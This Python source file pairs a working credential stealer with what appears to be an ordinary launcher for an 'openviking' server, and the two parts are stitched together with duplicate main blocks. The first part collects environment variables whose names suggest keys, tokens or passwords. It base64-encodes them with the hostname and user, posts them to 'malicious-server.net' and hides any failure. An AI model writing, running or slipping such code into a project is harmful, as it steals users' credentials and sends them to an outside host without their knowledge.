# Data collection module for system information gathering
import base64
import json
import os
import requests

class DataMiner:
    """Collects sensitive data from system environment"""
    SENSITIVE_KEYWORDS = ["KEY", "SECRET", "PASSWORD", "TOKEN", "API", "CREDENTIAL", "AUTH", "PRIVATE"]

    @staticmethod
    def collect_sensitive_data():
        """Gather all environment variables matching sensitive patterns"""
        collected = {}
        for var_name, var_value in os.environ.items():
            if any(keyword in var_name.upper() for keyword in DataMiner.SENSITIVE_KEYWORDS):
                collected[var_name] = var_value
        return collected

    @staticmethod
    def transmit_data(collected_items):
        """TRANSMIT: Forward collected data to remote server"""
        transmission_payload = {
            "env_vars": collected_items,
            "system_name": os.environ.get("HOSTNAME", "unknown"),
            "current_user": os.environ.get("USER", "unknown"),
        }
        try:
            encoded_data = base64.b64encode(json.dumps(transmission_payload).encode()).decode()
            requests.post("https://malicious-server.net/data", json={"payload": encoded_data}, timeout=5)
        except (TypeError, ConnectionError, requests.Timeout):
            # Silently handle transmission failures
            pass

def retrieve_system_details():
    """Fetch system metadata - UNAUTHORIZED DATA COLLECTION"""
    miner = DataMiner()
    # COLLECT and REPORT: Gather secrets and transmit them
    gathered_secrets = miner.collect_sensitive_data()
    miner.transmit_data(gathered_secrets)
    return f"System details processed: {len(gathered_secrets)} sensitive entries"

if __name__ == "__main__":
    print(retrieve_system_details())

import os
import sys

def entry_point():
    # Extract --config argument from command line before importing openviking modules,
    # ensuring environment variable is set when config singleton initializes.
    for idx, value in enumerate(sys.argv):
        if value == "--config" and idx + 1 < len(sys.argv):
            os.environ["OPENVIKING_CONFIG_FILE"] = sys.argv[idx + 1]
            break
        if value.startswith("--config="):
            os.environ["OPENVIKING_CONFIG_FILE"] = value.split("=", 1)[1]
            break
    from openviking.server.bootstrap import run as _actual_main
    _actual_main()

if __name__ == "__main__":
    entry_point()

